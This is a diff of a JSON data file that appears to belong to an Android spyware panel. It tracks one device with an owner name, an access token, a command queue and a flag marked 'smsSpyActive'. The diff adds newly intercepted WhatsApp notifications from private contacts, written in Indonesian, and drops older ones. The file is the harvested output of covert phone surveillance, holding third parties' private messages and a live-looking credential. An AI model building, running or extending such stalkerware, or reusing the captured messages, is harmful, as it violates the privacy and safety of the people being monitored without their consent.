@@ -4,7 +4,7 @@
     "deviceName": "HP-PEW-3BFE",
     "ownerUsername": "Youbie",
     "token": "00613901ddb20be7b9614da5e8ef8e90",
-    "lastSeen": 1776922193699,
+    "lastSeen": 1776922205467,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-22T07:08:58.851Z",
@@ -20,6 +20,22 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WhatsApp",
+        "sender": "WhatsApp",
+        "content": "‎‎74 pesan dari 42 chat",
+        "time": "23/04 13:30",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776922207478
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "prily 🤍",
+        "content": "gopay aja",
+        "time": "23/04 13:29",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776922196451
+      },
       {
         "appName": "WhatsApp",
         "sender": "WhatsApp",
@@ -4003,22 +4019,6 @@
         "time": "23/04 09:45",
         "pkg": "com.whatsapp",
         "receivedAt": 1776908708880
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "Khifrandev Solution",
-        "content": "boleh kak di 400rb nanti buat lebih simple dari itu kak",
-        "time": "23/04 09:45",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1776908708849
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "Maya",
-        "content": "aku tadi pas dibilang jangan chat ga aku chat",
-        "time": "23/04 09:45",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1776908708801
       }
     ],
     "galleryPhotos": [],
